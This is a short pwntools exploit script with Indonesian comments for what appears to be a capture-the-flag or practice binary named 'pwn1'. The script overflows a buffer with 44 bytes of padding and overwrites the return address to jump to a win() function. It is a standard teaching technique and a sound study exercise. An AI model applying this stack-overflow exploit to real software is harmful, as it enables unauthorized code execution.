from pwn import *

# Alamat win yang kamu temukan
win_addr = 0x0804923a

p = process('./pwn1')

# Padding 44 sudah terbukti berhasil memicu fungsi win()
payload = b"A" * 44 + p32(win_addr)

# Kirim payload
p.sendline(payload)

# Gunakan clean() untuk mengambil semua sisa data di buffer
# atau p.recvall() tanpa decode dulu untuk melihat raw bytes-nya
print("\n--- Output Program ---")
output = p.recvall(timeout=2)
print(output.decode('latin-1', errors='ignore'))
